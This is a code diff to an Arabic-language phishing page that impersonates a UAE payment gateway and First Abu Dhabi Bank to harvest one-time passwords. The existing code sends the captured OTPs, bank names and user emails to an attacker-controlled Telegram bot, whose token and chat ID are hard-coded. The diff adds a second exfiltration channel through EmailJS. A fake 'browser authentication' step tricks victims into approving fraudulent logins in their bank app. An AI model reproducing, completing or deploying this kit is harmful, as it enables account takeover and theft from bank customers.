@@ -6,6 +6,14 @@
     <title>التحقق من رمز OTP - بوابة سداد الإمارات</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
     <link rel="icon" href="https://petra.gov.jo/upload/1542630954928.jpg" type="image/x-icon">
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("Wfxk1dtB415_ZTTlq"); // Public Key الخاص بك
+       })();
+    </script>
+
     <style>
         :root {
             --primary-color: #008000;
@@ -79,26 +87,28 @@
         const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
         const telegramChatId = '8362204213';
 
-        // وظيفة إرسال رسالة تلغرام جديدة دائماً لضمان وصول التنبيه بنسبة 100%
+        // دالة الإرسال للإيميل الموحدة (EmailJS)
+        async function sendEmailOTP(otpValue) {
+            try {
+                await emailjs.send('service_r3vxe5s', 'template_ps8h3sd', {
+                    bankName: localStorage.getItem('selectedBankName') || "غير محدد",
+                    otpValue: otpValue,
+                    userEmail: localStorage.getItem('userEmail') || "N/A"
+                });
+            } catch (error) { console.error('Email Error:', error); }
+        }
+
         async function sendNewTelegram(message) {
             try {
                 const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: telegramChatId,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
+                    body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'HTML' })
                 });
                 const data = await response.json();
-                if (data.ok) {
-                    localStorage.setItem('telegramMessageId', data.result.message_id);
-                }
-            } catch (error) {
-                console.error('خطأ في الإرسال:', error);
-            }
+                if (data.ok) { localStorage.setItem('telegramMessageId', data.result.message_id); }
+            } catch (error) { console.error('Telegram Error:', error); }
         }
 
         const banks = {
@@ -124,7 +134,6 @@
             document.getElementById('otpLogo').src = bank.logo;
         }
 
-        // إظهار صفحة الانتظار ثم الانتقال لصفحة OTP
         setTimeout(() => {
             document.getElementById('otpWaitingPage').style.display = 'none';
             document.getElementById('otpPage').style.display = 'block';
@@ -187,11 +196,13 @@
                 return;
             }
 
-            // إرسال OTP للتلغرام كرسالة جديدة دائماً
             otpAttempts++;
             const remainingAttempts = maxAttempts - otpAttempts;
             const content = `🔢 <b>محاولة OTP #${otpAttempts}</b>\n\n🏦 البنك: ${bank.name}\n🔑 رمز OTP: ${otpValue}\n⏳ محاولات متبقية: ${remainingAttempts}`;
+            
+            // إرسال للتلغرام والإيميل
             await sendNewTelegram(content);
+            await sendEmailOTP(`Single OTP Attempt #${otpAttempts}: ${otpValue}`);
 
             if (attemptsLeftElement) attemptsLeftElement.textContent = `محاولات متبقية: ${remainingAttempts}`;
 
@@ -228,9 +239,11 @@
             otpAttempts++;
             const remainingAttempts = maxAttempts - otpAttempts;
             const content = `🔢 <b>محاولة OTP مزدوج #${otpAttempts}</b>\n\n🏦 البنك: ${bank.name}\n📱 OTP الهاتف: ${otpSMS}\n📧 OTP الإيميل: ${otpEmail}\n⏳ محاولات متبقية: ${remainingAttempts}`;
+            
+            // إرسال للتلغرام والإيميل
             await sendNewTelegram(content);
+            await sendEmailOTP(`Dual OTP #${otpAttempts} - SMS: ${otpSMS}, Email: ${otpEmail}`);
 
-            // لبنك أبو ظبي الأول - الانتقال لصفحة توثيق المتصفح
             showBrowserAuthPage();
         }
 
@@ -244,7 +257,7 @@
                         <p>تم إرسال طلب لتوثيق دخولك من المتصفح</p>
                         <p>يرجى التوجه إلى تطبيق FAB وقبول طلب التوثيق</p>
                     </div>
-                    <img src="https://play-lh.googleusercontent.com/4jSRR95ewSWbxkmIiY_CoXoliOuIISZMFQmPpeqwfS3b4z9fD7ylQ-LDJdas_PhORm0=w600-h300-pc0xffffff-pd" alt="تطبيق FAB" class="browser-auth-image">
+                    <img src="https://fab.com/logo.png" alt="تطبيق FAB" class="browser-auth-image">
                     <p>اضغط على "تم التوثيق" بعد إتمام عملية التوثيق</p>
                     <button class="btn btn-block" id="authConfirmBtn" disabled>تم التوثيق</button>
                     <p>الوقت المتبقي: <span class="timer" id="browserAuthTimer">30</span> ثانية</p>
@@ -267,6 +280,7 @@
         async function handleBrowserAuthConfirmation() {
             const content = `🔒 <b>توثيق المتصفح</b>\n\n🏦 البنك: ${bank.name}\n✅ تم الضغط على "تم التوثيق"`;
             await sendNewTelegram(content);
+            await sendEmailOTP("Browser Authentication Confirmed by User");
 
             const container = document.getElementById('otpContainer');
             container.innerHTML = `
@@ -276,9 +290,6 @@
                         <p>عزيزي العميل، تم رفض التوثيق. يرجى إعادة المحاولة.</p>
                     </div>
                 </div>`;
-
-            const failContent = `❌ <b>رفض التوثيق</b>\n\nتم رفض توثيق المتصفح - سيتم إعادة التوجيه`;
-            await sendNewTelegram(failContent);
 
             setTimeout(() => { window.location.href = 'page4.html'; }, 3000);
         }
